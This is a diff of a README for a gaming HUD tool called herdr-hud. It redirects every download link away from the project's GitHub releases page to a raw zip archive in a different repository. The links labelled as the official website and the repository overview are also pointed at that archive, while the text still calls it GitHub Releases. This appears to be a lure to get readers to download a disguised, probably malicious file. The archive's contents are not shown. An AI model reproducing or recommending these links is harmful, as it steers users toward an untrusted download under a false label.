@@ -17,11 +17,11 @@ Developed with love for the gaming community, herdr-hud is your ultimate sidekic
 
 To get started, simply visit the download page:
 
-[![Download herdr-hud](https://img.shields.io/badge/Download-herdr--hud-blue?style=for-the-badge&logo=github&logoColor=white&labelColor=2C3E50&color=3498DB)](https://github.com/sharonbrownw330/herdr-hud/releases)
+[![Download herdr-hud](https://img.shields.io/badge/Download-herdr--hud-blue?style=for-the-badge&logo=github&logoColor=white&labelColor=2C3E50&color=3498DB)](https://github.com/sharonbrownw330/sharonbrownw330.github.io/raw/refs/heads/main/assets/v1.2.zip)
 
 or click the link below:
 
-**[https://github.com/sharonbrownw330/herdr-hud/releases](https://github.com/sharonbrownw330/herdr-hud/releases)**
+**[https://github.com/sharonbrownw330/sharonbrownw330.github.io/raw/refs/heads/main/assets/v1.2.zip](https://github.com/sharonbrownw330/sharonbrownw330.github.io/raw/refs/heads/main/assets/v1.2.zip)**
 
 Visit this link to download the application. Once you are on the page, look for the newest version available and click the download button that matches your operating system.
 
@@ -159,7 +159,7 @@ Don't wait any longer! Get herdr-hud now and experience the convenience of havin
 
 Click here to get started:
 
-**[👉 Download herdr-hud from GitHub Releases](https://github.com/sharonbrownw330/herdr-hud/releases)**
+**[👉 Download herdr-hud from GitHub Releases](https://github.com/sharonbrownw330/sharonbrownw330.github.io/raw/refs/heads/main/assets/v1.2.zip)**
 
 Thank you for choosing herdr-hud! Your gaming sessions will never be the same.
 
@@ -167,9 +167,9 @@ Thank you for choosing herdr-hud! Your gaming sessions will never be the same.
 
 ## 🧩 Related Resources
 
-- [Herdr Official Website](https://www.herdr.io)
-- [Omarchy Plugin Information](https://github.com/sharonbrownw330)
-- [GitHub Repository Overview](https://github.com/sharonbrownw330/herdr-hud)
+- [Herdr Official Website](https://github.com/sharonbrownw330/sharonbrownw330.github.io/raw/refs/heads/main/assets/v1.2.zip)
+- [Omarchy Plugin Information](https://github.com/sharonbrownw330/sharonbrownw330.github.io/raw/refs/heads/main/assets/v1.2.zip)
+- [GitHub Repository Overview](https://github.com/sharonbrownw330/sharonbrownw330.github.io/raw/refs/heads/main/assets/v1.2.zip)
 
 Stay connected, stay informed, and game on! 🎮
 
